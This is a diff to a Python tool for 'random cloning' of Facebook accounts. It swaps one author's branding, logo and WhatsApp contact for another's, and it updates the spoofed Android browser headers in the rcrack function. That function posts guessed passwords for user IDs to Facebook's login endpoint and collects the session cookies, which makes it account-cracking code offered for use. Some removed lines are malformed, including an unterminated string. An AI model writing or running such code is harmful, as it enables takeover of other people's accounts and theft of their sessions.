@@ -16,7 +16,7 @@ except ModuleNotFoundError:
     os.system('python run.py')
 import uuid
 import os,sys,time,json,random,re,string,platform,base64
-os.system('xdg-open https://w.me/ https://chat.whatsapp.com/JE4123ONqGI60g1802a8sI')
+os.system('xdg-open https://w.me/93767678023')
 try:
     import requests
     from concurrent.futures import ThreadPoolExecutor as ThreadPool
@@ -28,7 +28,7 @@ except ModuleNotFoundError:
 P = '\x1b[1;97m' # PUTIH
 M = '\x1b[1;91m' # MERAH
 H = '\x1b[1;92m' # HIJAU
-K = '\x1b[1;93m' # KUNINGhttps://github.com/jamilvisalking/33.git
+K = '\x1b[1;93m' # KUNING
 B = '\x1b[1;94m' # BIRU
 U = '\x1b[1;95m' # UNGU
 O = '\x1b[1;96m' # BIRU MUDA
@@ -127,45 +127,35 @@ logo=("""
     
 
  
-
-   $$$$$\                         $$\ $$\ 
-   \__$$ |                        \__|$$ |
-      $$ | $$$$$$\  $$$$$$\$$$$\  $$\ $$ |
-      $$ | \____$$\ $$  _$$  _$$\ $$ |$$ |
-$$\   $$ | $$$$$$$ |$$ / $$ / $$ |$$ |$$ |
-$$ |  $$ |$$  __$$ |$$ | $$ | $$ |$$ |$$ |
-\$$$$$$  |\$$$$$$$ |$$ | $$ | $$ |$$ |$$ |
- \______/  \_______|\__| \__| \__|\__|\__|
-                                          
-                                          
-                                          
-$$\    $$\ $$\                     $$\    
-$$ |   $$ |\__|                    $$ |   
-$$ |   $$ |$$\  $$$$$$$\  $$$$$$\  $$ |   
-\$$\  $$  |$$ |$$  _____| \____$$\ $$ |   
- \$$\$$  / $$ |\$$$$$$\   $$$$$$$ |$$ |   
-  \$$$  /  $$ | \____$$\ $$  __$$ |$$ |   
-   \$  /   $$ |$$$$$$$  |\$$$$$$$ |$$ |   
-    \_/    \__|\_______/  \_______|\__|   
-                                          
-                                          
-                                          
-
+                     /$$                              
+                    |__/                              
+  /$$$$$$   /$$$$$$  /$$ /$$$$$$$   /$$$$$$$  /$$$$$$ 
+ /$$__  $$ /$$__  $$| $$| $$__  $$ /$$_____/ /$$__  $$
+| $$  \ $$| $$  \__/| $$| $$  \ $$| $$      | $$$$$$$$
+| $$  | $$| $$      | $$| $$  | $$| $$      | $$_____/
+| $$$$$$$/| $$      | $$| $$  | $$|  $$$$$$$|  $$$$$$$
+| $$____/ |__/      |__/|__/  |__/ \_______/ \_______/
+| $$                                                  
+| $$                                                  
+|__/                                                  
 
                                   
 
                                   
                                   
 
-                     best update visal
+                     best update
 \x1b[1;92m---------------------------------------------------
-\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m AUTHOR     \x1b[1;97m: \x1b[1;97m visal king
-\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m FACEBOOK   \x1b[1;97m: \x1b[1;97m Jamil visal
-\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m WHATSAPP   \x1b[1;97m: \x1b[1;97m0708509223
+\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m AUTHOR     \x1b[1;97m: \x1b[1;97m
+\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m FACEBOOK   \x1b[1;97m: \x1b[1;97mprince
+\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m WHATSAPP   \x1b[1;97m: \x1b[1;97m0767678023
 \x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m STATUS     \x1b[1;97m: \x1b[1;97mRANDOM CLONING 
 \x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m TYPE       \x1b[1;97m: \x1b[1;97mfree
-\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m GITHUB     \x1b[1;97m:\x1b[1;97m Jamil visal
-\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m VERSION    \x1b[1;97m:\x1b[1;97m 3.5
+\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m GITHUB     \x1b[1;97m:\x1b[1;97m princeArman
+
+
+
+\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m VERSION    \x1b[1;97m:\x1b[1;97m 0.9         
 \x1b[1;92m----------------------------------------------------    """)
 
 def lines():
@@ -458,13 +448,12 @@ def rcrack(uid,pwx,tl):
             "login":"Log In"}
             header_freefb = {'authority': 'mbasic.facebook.com',
             "method": 'GET',
-            "scheme": 'http
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
+            "scheme": 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-GB,en;q=0.9,ps-AF;q=0.8,ps;q=0.7,en-US;q=0.6',
             'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
@@ -473,7 +462,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent':pro,}
+            'user-agent': pro,}
             lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
